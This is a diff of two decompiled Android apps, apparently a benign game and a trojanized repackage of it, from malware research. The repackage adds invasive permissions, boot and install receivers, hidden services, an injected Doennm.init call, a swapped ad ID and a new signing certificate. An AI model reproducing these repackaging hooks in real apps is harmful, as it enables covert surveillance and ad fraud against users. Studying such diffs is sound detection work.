@@ -1,0 +1,270 @@
+diff -r result/APP_30/App_B_30/AndroidManifest.xml result/APP_30/App_M_30/AndroidManifest.xml
+2a3,12
+>     <uses-permission android:name="android.permission.INTERNET"/>
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.GET_TASKS"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+>     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+>     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+15a26,53
+>         <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.ushe.Ushema"/>
+>         <service android:name="com.ushe.Ushems"/>
+>         <receiver android:name="com.ushe.Ushemr">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:name="com.ushe.Cersea"/>
+>         <receiver android:name="com.ushe.Cerser">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
+>             </intent-filter>
+>         </receiver>
+>         <service android:name="com.ushe.Cerses"/>
+>         <meta-data android:name="UMENG_APPKEY" android:value="4ff5ae0a5270155bf800001a"/>
+>         <meta-data android:name="UMENG_CHANNEL" android:value="gfan"/>
+>         <meta-data android:name="tapjoy.store_name" android:value="gfan"/>
+diff -r result/APP_30/App_B_30/apktool.yml result/APP_30/App_M_30/apktool.yml
+2c2
+< apkFileName: Bapp30-3F70A9C6EE7F32B87FE7C26A0B9AB3E969A36C8A0ED3B4B54BE54F32C8CC6FE3.apk
+---
+> apkFileName: Mapp30-DBF52403855BEB084EC6D38BD93318CCA927302BFFCA904B77682FDE267E6210.apk
+5d4
+< - resources.arsc
+Somente em result/APP_30/App_M_30/assets: pa_res
+diff -r result/APP_30/App_B_30/bayaba/engine/SavingPrivateFly/Button.java result/APP_30/App_M_30/bayaba/engine/SavingPrivateFly/Button.java
+16a17
+> import com.gswemg.Doennm;
+38c39
+<     this.adView = new AdView(this, AdSize.BANNER, "a150b0dd1992d81");
+---
+>     this.adView = new AdView(this, AdSize.BANNER, "a1505eece908fa8");
+64a66
+>     Doennm.init(this);
+Somente em result/APP_30/App_M_30/com: android
+Somente em result/APP_30/App_M_30/com: app
+Somente em result/APP_30/App_M_30/com: gswemg
+Somente em result/APP_30/App_M_30/com: pa
+Somente em result/APP_30/App_M_30/com: QLJGameCommon
+Somente em result/APP_30/App_M_30/com: tapjoy
+Somente em result/APP_30/App_M_30/com: umeng
+Somente em result/APP_30/App_M_30/com: ushe
+Os arquivos binários result/APP_30/App_B_30/original/AndroidManifest.xml e result/APP_30/App_M_30/original/AndroidManifest.xml são diferentes
+Somente em result/APP_30/App_B_30/original/META-INF: CERT.RSA
+Somente em result/APP_30/App_B_30/original/META-INF: CERT.SF
+diff -r result/APP_30/App_B_30/original/META-INF/MANIFEST.MF result/APP_30/App_M_30/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.0 (Android)
+---
+> Created-By: 1.6.0 (Sun Microsystems Inc.)
+7,8c7,8
+< Name: res/raw/eat.wav
+< SHA1-Digest: CvQSy0Rk6GKdfqCiG3B7gaNPru8=
+---
+> Name: assets/pa_res/spot_light.png
+> SHA1-Digest: HDYglOL1e3Rk0VmuY8QCQ0oNoTs=
+13,21d12
+< Name: assets/Back1.spr
+< SHA1-Digest: mND8R7WMJVwnVK0ZXt2dpF0f1qI=
+< 
+< Name: res/drawable-hdpi/ic_launcher.png
+< SHA1-Digest: PYBd/by7EH1ogw+UlK6Gc2dVYlA=
+< 
+< Name: assets/logo.png
+< SHA1-Digest: I+sG4WVRr12crA2TIm+0UZ2+6d4=
+< 
+30a22,102
+> Name: assets/fly4.png
+> SHA1-Digest: cySCVr5gqoPth/7qggSo0UtfjTI=
+> 
+> Name: assets/fly.spr
+> SHA1-Digest: Pxji651pL06dLjARspPS1UTXEq8=
+> 
+> Name: assets/pa_res/icon.png
+> SHA1-Digest: xojjGOMaFE9l5JGijGWsO/RgymY=
+> 
+> Name: assets/Back2.png
+> SHA1-Digest: 4rOD8Wd2/SmDZJl0b/KSlOWKVJQ=
+> 
+> Name: assets/Back1.png
+> SHA1-Digest: 9eil1/yCqDGWEzEz5DRCgjoEm9c=
+> 
+> Name: assets/pa_res/360.png
+> SHA1-Digest: l+Fj8rnP63ymLQTbbTeI2n7q89k=
+> 
+> Name: assets/pa_res/spot_default.png
+> SHA1-Digest: E4fi2Oiw3vnkWEnhps2hIa4+gp8=
+> 
+> Name: assets/pa_res/download_btn2_pressed.png
+> SHA1-Digest: AtUClOw6HmlJO+VrNZ7YD/BWibQ=
+> 
+> Name: assets/pa_res/download_btn2.png
+> SHA1-Digest: MBPHHzDxFqdfXsBLtm7DSajWU1w=
+> 
+> Name: assets/Back3.png
+> SHA1-Digest: ocDZWjtU1eDSU+r3h1InwVRWwQE=
+> 
+> Name: assets/pa_res/push_cancel_btn.png
+> SHA1-Digest: xFZxC1NS0KoZjvtGL4hUEAZ1oMM=
+> 
+> Name: assets/Intro.ani
+> SHA1-Digest: oc8FRqDLgRMV3h2san/mr/+z61Y=
+> 
+> Name: assets/Back1.ani
+> SHA1-Digest: kwdB67eIY2y+F6m31jJShbpqZKg=
+> 
+> Name: res/raw/block.wav
+> SHA1-Digest: Iro2vax2YfnxMeX4gp9aDjyCD4o=
+> 
+> Name: res/layout/main.xml
+> SHA1-Digest: UR4O/o/AQvtppP252efA0B+NOKU=
+> 
+> Name: res/raw/intro.mp3
+> SHA1-Digest: py2aaRrORpLpGlJpC5kWjDx4QkU=
+> 
+> Name: assets/fly4.spr
+> SHA1-Digest: GT7ufXD3MfXAA+erkgsOoU8DaQI=
+> 
+> Name: assets/Back4.ani
+> SHA1-Digest: VO2O2A0q47PsQlbDiySRgxfdNQE=
+> 
+> Name: assets/pa_res/snapshot_empty.png
+> SHA1-Digest: DSmTSCP3TKTP8Cw8/9byyIcYP28=
+> 
+> Name: res/raw/thunder.wav
+> SHA1-Digest: IWADuJ2D6lPo+Pyf05b7LVGYwr0=
+> 
+> Name: assets/Back3.spr
+> SHA1-Digest: g1Kz3uNKXR/m2ooGZ+aMt8cJJZ8=
+> 
+> Name: res/raw/eat.wav
+> SHA1-Digest: CvQSy0Rk6GKdfqCiG3B7gaNPru8=
+> 
+> Name: assets/pa_res/fold_arrow.png
+> SHA1-Digest: aPV5nrym+b3yv4JxlPO9BHg6+k0=
+> 
+> Name: assets/Back1.spr
+> SHA1-Digest: mND8R7WMJVwnVK0ZXt2dpF0f1qI=
+> 
+> Name: assets/logo.png
+> SHA1-Digest: I+sG4WVRr12crA2TIm+0UZ2+6d4=
+> 
+> Name: res/drawable-hdpi/ic_launcher.png
+> SHA1-Digest: PYBd/by7EH1ogw+UlK6Gc2dVYlA=
+> 
+> Name: assets/pa_res/push_cancel_btn_pressed.png
+> SHA1-Digest: CbQHVmHL3PxfmzP+MMFrIUI9vT4=
+> 
+38,41c110
+< SHA1-Digest: CjPeQa89uYOFoECVFJsDfiws1v0=
+< 
+< Name: assets/fly4.png
+< SHA1-Digest: cySCVr5gqoPth/7qggSo0UtfjTI=
+---
+> SHA1-Digest: mosb5uSqiaJWBBLKbzADTGC9F8A=
+46,48d114
+< Name: assets/fly.spr
+< SHA1-Digest: Pxji651pL06dLjARspPS1UTXEq8=
+< 
+50c116
+< SHA1-Digest: ZtsGGOzaviwU/XU853ZnUli1QHk=
+---
+> SHA1-Digest: 8EGWJ7Ov/IY57CFtNRUnlnlM4qM=
+58,63d123
+< Name: assets/Back2.png
+< SHA1-Digest: 4rOD8Wd2/SmDZJl0b/KSlOWKVJQ=
+< 
+< Name: assets/Back1.png
+< SHA1-Digest: 9eil1/yCqDGWEzEz5DRCgjoEm9c=
+< 
+70,72d129
+< Name: assets/Back3.png
+< SHA1-Digest: ocDZWjtU1eDSU+r3h1InwVRWwQE=
+< 
+76,78d132
+< Name: assets/Intro.ani
+< SHA1-Digest: oc8FRqDLgRMV3h2san/mr/+z61Y=
+< 
+83,89c137
+< SHA1-Digest: nmC/bP2l543vpB5yfjs+jGihDao=
+< 
+< Name: assets/Back1.ani
+< SHA1-Digest: kwdB67eIY2y+F6m31jJShbpqZKg=
+< 
+< Name: assets/Back4.png
+< SHA1-Digest: tmFTLDPgDIZu4kJF2jrbMkXedp0=
+---
+> SHA1-Digest: KJqKcfCHt28e7KfDIOPP2u0rAwQ=
+94,95c142,143
+< Name: res/raw/block.wav
+< SHA1-Digest: Iro2vax2YfnxMeX4gp9aDjyCD4o=
+---
+> Name: assets/Back4.png
+> SHA1-Digest: tmFTLDPgDIZu4kJF2jrbMkXedp0=
+100,105d147
+< Name: res/layout/main.xml
+< SHA1-Digest: yiYXAunNjRZPYCKdNsw/h6KY67M=
+< 
+< Name: res/raw/intro.mp3
+< SHA1-Digest: py2aaRrORpLpGlJpC5kWjDx4QkU=
+< 
+109,111d150
+< Name: res/drawable-mdpi/ic_launcher.png
+< SHA1-Digest: RcLfOv+DuGDcC1IhBRE5goA4rPU=
+< 
+115,116c154,155
+< Name: assets/fly4.spr
+< SHA1-Digest: GT7ufXD3MfXAA+erkgsOoU8DaQI=
+---
+> Name: res/drawable-mdpi/ic_launcher.png
+> SHA1-Digest: RcLfOv+DuGDcC1IhBRE5goA4rPU=
+118,119c157,158
+< Name: assets/Back4.ani
+< SHA1-Digest: VO2O2A0q47PsQlbDiySRgxfdNQE=
+---
+> Name: assets/pa_res/confirm_btn.png
+> SHA1-Digest: YuSe5o0DswmLLQmJLeyoTs7alDY=
+123a163,165
+> Name: assets/pa_res/confirm_btn_pressed.png
+> SHA1-Digest: oY/MZIRapnKGabQhUv9sd8CPCbQ=
+> 
+126,131d167
+< 
+< Name: res/raw/thunder.wav
+< SHA1-Digest: IWADuJ2D6lPo+Pyf05b7LVGYwr0=
+< 
+< Name: assets/Back3.spr
+< SHA1-Digest: g1Kz3uNKXR/m2ooGZ+aMt8cJJZ8=
+Somente em result/APP_30/App_M_30/original/META-INF: RANGFEI.RSA
+Somente em result/APP_30/App_M_30/original/META-INF: RANGFEI.SF
+diff -r result/APP_30/App_B_30/smali/bayaba/engine/SavingPrivateFly/Button.smali result/APP_30/App_M_30/smali/bayaba/engine/SavingPrivateFly/Button.smali
+55c55
+<     const-string v5, "a150b0dd1992d81"
+---
+>     const-string v5, "a1505eece908fa8"
+164a165,166
+> 
+>     invoke-static {p0}, Lcom/gswemg/Doennm;->init(Landroid/content/Context;)V
+Somente em result/APP_30/App_M_30/smali/com: android
+Somente em result/APP_30/App_M_30/smali/com: app
+Somente em result/APP_30/App_M_30/smali/com: gswemg
+Somente em result/APP_30/App_M_30/smali/com: pa
+Somente em result/APP_30/App_M_30/smali/com: QLJGameCommon
+Somente em result/APP_30/App_M_30/smali/com: tapjoy
+Somente em result/APP_30/App_M_30/smali/com: umeng
+Somente em result/APP_30/App_M_30/smali/com: ushe
